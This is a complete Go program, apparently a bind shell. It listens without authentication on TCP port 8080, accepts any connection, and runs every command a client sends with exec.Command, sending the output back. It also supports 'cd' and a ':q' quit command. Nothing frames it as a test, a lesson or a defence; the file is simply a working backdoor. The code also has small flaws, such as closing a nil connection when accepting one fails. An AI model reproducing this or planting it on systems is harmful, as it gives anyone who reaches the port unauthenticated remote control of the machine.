package main

import (
    "strings"
    "os/exec"
    "fmt"
    "net"
    "os"
)

const (
    PROTOCOL = "tcp"
    PORT = ":8080"
    BUFF = 2048
)

func main () {

    var (
        listener net.Listener
        conn net.Conn
        err error
    )

    listener, err = net.Listen(PROTOCOL, PORT) 
    check_error(err)
    defer listener.Close() 

    for { 
        conn, err = listener.Accept() 
        if err != nil { 
            conn.Close() 
            continue
        } 
        go get_connection(conn)
    } 
}

func get_connection (conn net.Conn) {

    var (
        str_command string
        command []string

        output []byte
        input []byte

        length int
        err error
    )

    defer conn.Close()
    input = make([]byte, BUFF) 

    for {
        length, err = conn.Read(input)
        if length == 0 || err != nil { break }

        str_command = string(input[:length])
        command = strings.Split(str_command, " ")

        switch (command[0]) {
            case ":q": 
                return

            case "cd": 
                if len(str_command) != 2 {
                    os.Chdir(str_command[3:length])
                }
                conn.Write([]byte("<-")) 

            default:
                output, err = exec.Command(command[0], command[1:]...).Output()

                if len(output) == 0 || err != nil { 
                    conn.Write([]byte("<-")) 
                } else {
                    conn.Write(output) 
                }
        }
    }
}

func check_error (err error) {
    if err != nil {
        fmt.Println("Error:",err) 
        os.Exit(1)
    } 
}
